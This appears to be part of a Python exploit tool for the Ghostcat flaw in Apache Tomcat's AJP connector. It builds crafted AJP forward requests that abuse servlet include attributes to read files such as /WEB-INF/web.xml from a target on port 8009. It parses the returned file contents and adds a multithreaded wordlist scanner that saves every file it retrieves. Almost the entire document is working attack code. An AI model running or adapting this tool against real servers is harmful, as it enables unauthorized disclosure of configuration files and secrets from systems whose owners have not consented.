class AJPForwardRequest:
    """Constructs an AJP Forward Request packet"""
    
    AJP13_FORWARD_REQUEST = 0x02
    
    def __init__(self, rhost: str, filename: str = '/WEB-INF/web.xml'):
        self.rhost = rhost
        self.filename = filename
        
    def pack_string(self, data: str) -> bytes:
        """Pack a string with length prefix"""
        if data is None:
            return struct.pack('>H', 0xFFFF)
        encoded = data.encode('utf-8')
        return struct.pack('>H', len(encoded)) + encoded + b'\x00'
    
    def pack_header(self, name: str, value: str) -> bytes:
        """Pack an HTTP header"""
        common_headers = {
            'accept': 0xA001, 'accept-charset': 0xA002, 'accept-encoding': 0xA003,
            'accept-language': 0xA004, 'authorization': 0xA005, 'connection': 0xA006,
            'content-type': 0xA007, 'content-length': 0xA008, 'cookie': 0xA009,
            'cookie2': 0xA00A, 'host': 0xA00B, 'pragma': 0xA00C,
            'referer': 0xA00D, 'user-agent': 0xA00E
        }
        
        result = b''
        name_lower = name.lower()
        
        if name_lower in common_headers:
            result += struct.pack('>H', common_headers[name_lower])
        else:
            result += self.pack_string(name)
        
        result += self.pack_string(value)
        return result
    
    def build_request(self) -> bytes:
        """Build the complete AJP forward request"""
        req_body = b''
        req_body += struct.pack('B', self.AJP13_FORWARD_REQUEST)
        req_body += struct.pack('B', 2)
        req_body += self.pack_string('HTTP/1.1')
        req_body += self.pack_string('/index.txt')
        req_body += self.pack_string('127.0.0.1')
        req_body += self.pack_string('localhost')
        req_body += self.pack_string(self.rhost)
        req_body += struct.pack('>H', 8080)
        req_body += struct.pack('B', 0)
        req_body += struct.pack('>H', 1)
        req_body += self.pack_header('host', f'{self.rhost}:8080')
        req_body += struct.pack('B', 0x0A)
        req_body += self.pack_string('javax.servlet.include.request_uri')
        req_body += self.pack_string('index')
        req_body += struct.pack('B', 0x0A)
        req_body += self.pack_string('javax.servlet.include.path_info')
        req_body += self.pack_string(self.filename)
        req_body += struct.pack('B', 0x0A)
        req_body += self.pack_string('javax.servlet.include.servlet_path')
        req_body += self.pack_string('/')
        req_body += struct.pack('B', 0xFF)
        
        ajp_packet = b'\x12\x34' + struct.pack('>H', len(req_body)) + req_body
        return ajp_packet


class GhostcatExploit:
    """Main exploit class"""
    
    def __init__(self, rhost: str, rport: int = 8009, filename: str = '/WEB-INF/web.xml', 
                 timeout: int = 5, verbose: bool = False):
        self.rhost = rhost
        self.rport = rport
        self.filename = filename
        self.timeout = timeout
        self.verbose = verbose
        self.sock = None
        
    def log(self, message: str):
        if self.verbose:
            print(message)
        
    def send_and_receive(self, data: bytes) -> bytes:
        """Send AJP request and receive response"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            self.log(f"[*] Connecting to {self.rhost}:{self.rport}...")
            self.sock.connect((self.rhost, self.rport))
            self.log("[*] Connected successfully")
            
            self.sock.sendall(data)
            
            response = b''
            max_reads = 20
            read_count = 0
            
            while read_count < max_reads:
                try:
                    chunk = self.sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    read_count += 1
                    
                    if b'\x05' in chunk:
                        self.log("[*] End response marker detected")
                        break
                    
                    if len(chunk) < 1024:
                        break
                        
                except socket.timeout:
                    break
                    
            return response
            
        except socket.timeout:
            return b''
        except (ConnectionRefusedError, ConnectionResetError, OSError):
            return b''
        except Exception as e:
            self.log(f"[-] Error: {e}")
            return b''
        finally:
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass
    
    def parse_response(self, response: bytes) -> Tuple[int, str]:
        """Parse AJP response and extract file content"""
        
        if not response or len(response) < 5:
            return 0, ""
        
        body = ""
        status = 0
        pos = 0
        response_len = len(response)
        
        while pos < response_len - 4:
            if response[pos:pos+2] == b'\x41\x42':
                pass
            elif response[pos:pos+2] == b'\x12\x34':
                pass
            else:
                pos += 1
                continue
            
            if pos + 4 > response_len:
                break
                
            packet_length = struct.unpack('>H', response[pos+2:pos+4])[0]
            
            if pos + 4 + packet_length > response_len:
                break
            
            packet_data = response[pos+4:pos+4+packet_length]
            
            if len(packet_data) == 0:
                pos += 4 + packet_length
                continue
            
            prefix_code = packet_data[0]
            
            if prefix_code == 0x03:
                if len(packet_data) > 2:
                    chunk_length = struct.unpack('>H', packet_data[1:3])[0]
                    if len(packet_data) >= 3 + chunk_length:
                        body_data = packet_data[3:3+chunk_length]
                        body += body_data.decode('utf-8', errors='ignore')
            
            elif prefix_code == 0x04:
                if len(packet_data) > 2:
                    status = struct.unpack('>H', packet_data[1:3])[0]
            
            elif prefix_code == 0x05:
                break
            
            pos += 4 + packet_length
        
        return status, body
    
    def exploit(self) -> Tuple[bool, Optional[str]]:
        """Execute the exploit"""
        self.log(f"[*] Target: {self.rhost}:{self.rport}")
        self.log(f"[*] File: {self.filename}")
        
        ajp_request = AJPForwardRequest(self.rhost, self.filename)
        request_data = ajp_request.build_request()
        
        response = self.send_and_receive(request_data)
        
        if not response:
            return False, None
        
        status, body = self.parse_response(response)
        
        if status == 200 and body:
            return True, body
        else:
            return False, None

def parse_target(target: str, default_port: int) -> Tuple[str, int]:
    """Parse target string (supports IP or IP:PORT format)"""
    if ':' in target:
        parts = target.split(':')
        return parts[0], int(parts[1])
    return target, default_port

def run_wordlist_scan(target: str, port: int, wordlist: List[str], 
                     timeout: int, verbose: bool, output_dir: Optional[str],
                     threads: int):
    """Scan single target with multiple files"""
    
    print(f"\n{'='*60}")
    print(f"Scanning: {target}:{port}")
    print(f"Files: {len(wordlist)} | Threads: {threads}")
    print('='*60)
    
    if len(wordlist) == 0:
        print("[-] ERROR: Wordlist is empty! No files to test.")
        return {'found': [], 'tested': 0}
    
    results = {'found': [], 'tested': 0, 'target': target, 'port': port}
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(exploit_single_file, target, port, filename, timeout, verbose): filename
            for filename in wordlist
        }
        
        for future in as_completed(futures):
            if shutdown_flag:
                executor.shutdown(wait=False)
                break
            
            filename = futures[future]
            results['tested'] += 1
            
            try:
                result = future.result()
                
                if result and result['success']:
                    print(f"\n[+] FOUND: {filename} ({result['size']} bytes)")
                    
                    if output_dir:
                        try:
                            os.makedirs(output_dir, exist_ok=True)
                            safe_name = filename.replace('/', '_').replace('..', '_')
                            output_file = os.path.join(output_dir, f"{target}_{port}_{safe_name}.txt")
                            
                            with open(output_file, 'w', encoding='utf-8') as f:
                                f.write(result['content'])
                            result['output_file'] = output_file
                            print(f"    Saved to: {output_file}")
                        except Exception as e:
                            if verbose:
                                print(f"    [-] Save error: {e}")
                    
                    results['found'].append(result)
                
                if not verbose and results['tested'] % 10 == 0:
                    elapsed = time.time() - start_time
                    rate = results['tested'] / elapsed if elapsed > 0 else 0
                    eta = (len(wordlist) - results['tested']) / rate if rate > 0 else 0
                    print(f"\r[*] Progress: {results['tested']}/{len(wordlist)} ({rate:.1f} files/s, ETA: {eta:.0f}s)   ", end='', flush=True)
                    
            except Exception as e:
                if verbose:
                    print(f"[-] Error with {filename}: {e}")
    
    if not verbose:
        print()
    
    elapsed = time.time() - start_time
    
    print(f"\n{'=' * 60}")
    print(f"SCAN SUMMARY - {target}:{port}")
    print("=" * 60)
    print(f"Files tested: {results['tested']}")
    print(f"Files found: {len(results['found'])}")
    print(f"Time elapsed: {elapsed:.2f}s")
    if elapsed > 0:
        print(f"Average rate: {results['tested']/elapsed:.1f} files/s")
    
    if results['found']:
        print("\n[+] Found files:")
        for r in results['found']:
            print(f"    {r['file']} ({r['size']} bytes)")
    
    return results
